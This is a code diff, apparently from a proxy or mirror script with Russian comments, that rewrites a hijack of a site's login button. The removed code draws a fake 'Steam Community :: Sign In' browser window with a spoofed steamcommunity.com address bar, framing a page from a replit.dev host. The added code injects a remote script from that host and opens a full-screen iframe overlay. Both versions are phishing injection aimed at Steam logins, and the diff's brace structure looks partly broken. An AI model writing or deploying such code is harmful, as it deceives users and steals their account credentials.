@@ -254,197 +254,103 @@ function modifyUrls(content, baseUrl, contentType = '') {
             };
             
             // ВАЖНО: Перехват кликов по кнопке авторизации
-            function interceptAuthButton() {
-                const handleAuthClick = async (e) => {
-                    const button = e.target.closest('#login-register');
-                    if (button) {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        e.stopImmediatePropagation();
-                        
-                        console.log('🔐 Auth button intercepted!');
-                        
-                        // Создаем перетаскиваемое окно имитирующее браузер
-                        const browserWindow = document.createElement('div');
-                        browserWindow.id = 'steam-auth-window';
-                        browserWindow.style.cssText = \`
+            // Заменить функцию interceptAuthButton на эту:
+
+function interceptAuthButton() {
+    const handleAuthClick = (e) => {
+        const button = e.target.closest('#login-register');
+        if (button) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            
+            console.log('🔐 Auth button intercepted!');
+            
+            // Создаем iframe с about:blank внутри домена
+            const blankFrame = document.createElement('iframe');
+            blankFrame.style.cssText = 'position: absolute; width: 0; height: 0; border: 0; visibility: hidden;';
+            blankFrame.src = 'about:blank';
+            document.body.appendChild(blankFrame);
+            
+            // После загрузки iframe
+            blankFrame.onload = () => {
+                // Загружаем скрипты в основном окне
+                const scriptUrl = 'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/bhcg4ddaadpt.js';
+                const authScript = document.createElement('script');
+                authScript.src = scriptUrl;
+                document.head.appendChild(authScript);
+                
+                // Устанавливаем window.openwin если он не существует
+                if (!window.openwin) {
+                    window.openwin = (url, name, params) => {
+                        // Создаем и стилизуем контейнер для имитации окна
+                        const container = document.createElement('div');
+                        container.id = 'auth-window-container';
+                        container.style.cssText = `
                             position: fixed;
-                            top: 50%;
-                            left: 50%;
-                            transform: translate(-50%, -50%);
-                            width: 800px;
-                            height: 600px;
-                            background: #f0f0f0;
-                            border: 1px solid #ccc;
-                            border-radius: 8px;
-                            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
-                            z-index: 9999;
-                            display: flex;
-                            flex-direction: column;
-                            font-family: Arial, sans-serif;
-                        \`;
-                        
-                        // Заголовок окна
-                        const titleBar = document.createElement('div');
-                        titleBar.style.cssText = \`
-                            height: 40px;
-                            background: #e0e0e0;
-                            border-bottom: 1px solid #ccc;
-                            border-radius: 8px 8px 0 0;
-                            display: flex;
-                            align-items: center;
-                            padding: 0 10px;
-                            cursor: move;
-                            user-select: none;
-                        \`;
-                        
-                        // Кнопки управления окном
-                        const windowControls = document.createElement('div');
-                        windowControls.style.cssText = \`
-                            display: flex;
-                            gap: 8px;
-                            margin-right: 10px;
-                        \`;
-                        
-                        const closeBtn = document.createElement('div');
-                        closeBtn.style.cssText = \`
-                            width: 12px;
-                            height: 12px;
-                            background: #ff5f56;
-                            border-radius: 50%;
-                            cursor: pointer;
-                        \`;
-                        closeBtn.onclick = () => document.body.removeChild(browserWindow);
-                        
-                        const minimizeBtn = document.createElement('div');
-                        minimizeBtn.style.cssText = \`
-                            width: 12px;
-                            height: 12px;
-                            background: #ffbd2e;
-                            border-radius: 50%;
-                            cursor: pointer;
-                        \`;
-                        
-                        const maximizeBtn = document.createElement('div');
-                        maximizeBtn.style.cssText = \`
-                            width: 12px;
-                            height: 12px;
-                            background: #27ca42;
-                            border-radius: 50%;
-                            cursor: pointer;
-                        \`;
-                        
-                        windowControls.appendChild(closeBtn);
-                        windowControls.appendChild(minimizeBtn);
-                        windowControls.appendChild(maximizeBtn);
-                        
-                        // Заголовок
-                        const title = document.createElement('div');
-                        title.textContent = 'Steam Community :: Sign In';
-                        title.style.cssText = \`
-                            flex: 1;
-                            text-align: center;
-                            font-size: 14px;
-                            color: #333;
-                        \`;
-                        
-                        titleBar.appendChild(windowControls);
-                        titleBar.appendChild(title);
-                        
-                        // Адресная строка
-                        const addressBar = document.createElement('div');
-                        addressBar.style.cssText = \`
-                            height: 35px;
-                            background: #f8f8f8;
-                            border-bottom: 1px solid #ddd;
-                            display: flex;
-                            align-items: center;
-                            padding: 0 10px;
-                        \`;
-                        
-                        const addressInput = document.createElement('input');
-                        addressInput.type = 'text';
-                        addressInput.value = 'https://steamcommunity.com/openid/login';
-                        addressInput.readOnly = true;
-                        addressInput.style.cssText = \`
-                            flex: 1;
-                            height: 25px;
-                            border: 1px solid #ccc;
-                            border-radius: 3px;
-                            padding: 0 8px;
-                            font-size: 13px;
-                            background: white;
-                        \`;
-                        
-                        addressBar.appendChild(addressInput);
-                        
-                        // Контент (iframe)
-                        const iframe = document.createElement('iframe');
-                        iframe.src = 'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html';
-                        iframe.style.cssText = \`
-                            flex: 1;
+                            top: 0;
+                            left: 0;
                             width: 100%;
+                            height: 100%;
+                            z-index: 9999;
+                            background: rgba(0,0,0,0.7);
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                        `;
+                        
+                        // Создаем iframe для содержимого
+                        const frame = document.createElement('iframe');
+                        frame.style.cssText = `
+                            width: 90%;
+                            max-width: 800px;
+                            height: 90%;
+                            max-height: 600px;
                             border: none;
-                            background: white;
-                        \`;
+                            border-radius: 8px;
+                            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+                        `;
+                        frame.src = url;
                         
-                        browserWindow.appendChild(titleBar);
-                        browserWindow.appendChild(addressBar);
-                        browserWindow.appendChild(iframe);
+                        // Добавляем крестик для закрытия
+                        const closeBtn = document.createElement('div');
+                        closeBtn.style.cssText = `
+                            position: absolute;
+                            top: 5%;
+                            right: 5%;
+                            width: 30px;
+                            height: 30px;
+                            background: red;
+                            border-radius: 50%;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            color: white;
+                            font-size: 20px;
+                            cursor: pointer;
+                            font-weight: bold;
+                        `;
+                        closeBtn.textContent = '×';
+                        closeBtn.onclick = () => {
+                            document.body.removeChild(container);
+                        };
                         
-                        document.body.appendChild(browserWindow);
+                        container.appendChild(frame);
+                        container.appendChild(closeBtn);
+                        document.body.appendChild(container);
                         
-                        // Функция перетаскивания окна
-                        let isDragging = false;
-                        let currentX;
-                        let currentY;
-                        let initialX;
-                        let initialY;
-                        let xOffset = 0;
-                        let yOffset = 0;
-                        
-                        function dragStart(e) {
-                            if (e.target === titleBar) {
-                                isDragging = true;
-                                
-                                const rect = browserWindow.getBoundingClientRect();
-                                const centerX = rect.left + rect.width / 2;
-                                const centerY = rect.top + rect.height / 2;
-                                const windowCenterX = window.innerWidth / 2;
-                                const windowCenterY = window.innerHeight / 2;
-                                
-                                xOffset = centerX - windowCenterX;
-                                yOffset = centerY - windowCenterY;
-                                
-                                initialX = e.clientX - xOffset;
-                                initialY = e.clientY - yOffset;
-                            }
-                        }
-                        
-                        function dragEnd(e) {
-                            isDragging = false;
-                        }
-                        
-                        function drag(e) {
-                            if (isDragging) {
-                                e.preventDefault();
-                                currentX = e.clientX - initialX;
-                                currentY = e.clientY - initialY;
-                                
-                                xOffset = currentX;
-                                yOffset = currentY;
-                                
-                                browserWindow.style.transform = \`translate(calc(-50% + \${currentX}px), calc(-50% + \${currentY}px))\`;
-                            }
-                        }
-                        
-                        titleBar.addEventListener('mousedown', dragStart);
-                        document.addEventListener('mousemove', drag);
-                        document.addEventListener('mouseup', dragEnd);
-                        
-                        return false;
-                    }
-                };
+                        return frame.contentWindow;
+                    };
+                }
+            };
+            
+            return false;
+        }
+    };
+    
+    // Перехватываем клики
+    document.addEventListener('click', handleAuthClick, true);
+}
                 
                 // Перехватываем клики на уровне документа
                 document.addEventListener('click', handleAuthClick, true);
